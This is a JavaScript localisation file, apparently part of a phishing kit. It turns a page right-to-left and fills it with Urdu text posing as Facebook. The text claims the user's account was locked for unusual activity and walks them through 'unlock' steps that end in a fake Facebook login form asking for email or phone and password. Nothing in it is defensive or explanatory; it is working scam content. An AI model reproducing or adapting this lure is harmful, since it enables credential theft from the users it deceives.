document.getElementsByTagName("body")[0].style.direction = "rtl";
document.querySelector(".borderline").style.cssText = `border-left: none;border-right: 2px solid #e4e6eb; margin-left: 0%;margin-right: 7%;`;
document.querySelector(".home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-s-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-t-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-container1 .logo").style.cssText = `margin-right: 20px;`;
var mq = window.matchMedia( "(max-width: 570px)" );
if (mq.matches) {
   document.querySelector(".home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`
   document.querySelector(".home-s-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`;
	document.querySelector(".home-t-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`;
}



var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");


mainHeader.innerHTML ="آپ کا اکاؤنٹ بند کر دیا گیا ہے";
mainParagraph.innerHTML ="ہم نے آپ کے اکاؤنٹ پر غیر معمولی سرگرمی دیکھی۔ اس کا مطلب یہ ہو سکتا ہے کہ کسی نے آپ کے علم کے بغیر آپ کا اکاؤنٹ استعمال کیا ہے۔";
lockedHeader.innerHTML ="اکاؤنٹ 10 نومبر 2021 کو لاک ہو گیا۔";
lockedParagraph.innerHTML ="آپ کی حفاظت کے لیے، آپ کا پروفائل Facebook پر لوگوں کو نظر نہیں آتا اور آپ اپنا اکاؤنٹ استعمال نہیں کر سکتے۔";
footerParagraph.innerHTML ="ہم آپ کے اکاؤنٹ کو غیر مقفل کرنے کے لیے کچھ اقدامات کریں گے۔";
getStarted.innerHTML ="شروع کرنے کے";
nextHeader.innerHTML ="اپنے اکاؤنٹ کو کیسے غیر مقفل کریں۔";
fristLineHeader.innerHTML ="تصدیق کریں کہ یہ آپ کا اکاؤنٹ ہے۔";
fristLineParagraph.innerHTML ="چونکہ کسی اور کو رسائی حاصل ہو سکتی ہے، اس سے پہلے کہ ہم مزید آگے بڑھیں ہمیں تصدیق کرنی ہوگی کہ آپ اس اکاؤنٹ کے مالک ہیں۔";
secoundLineHeader.innerHTML ="اپنی لاگ ان تفصیلات کو محفوظ بنائیں";
thirdLineHeader.innerHTML ="آپ کا اکاؤنٹ غیر مقفل ہو جائے گا۔";
nextButton.innerHTML ="اگلے";
backButton.innerHTML ="پیچھے";
logHeading.innerHTML ="فیس بک میں لاگ ان کریں۔";
logAlert.innerHTML ="آپ کو پہلے لاگ ان کرنے کی ضرورت ہے۔";
logAlert2.innerHTML ="آپ کو پہلے لاگ ان کرنے کی ضرورت ہے۔";
userInput.setAttribute("placeholder" , "ای میل ایڈریس یا فون نمبر");
passInput.setAttribute("placeholder" , "پاس ورڈ");
logButton.innerHTML ="لاگ ان کریں";
or.innerHTML ="یا";
createButton.innerHTML ="نیا اکاؤنٹ بنانے";
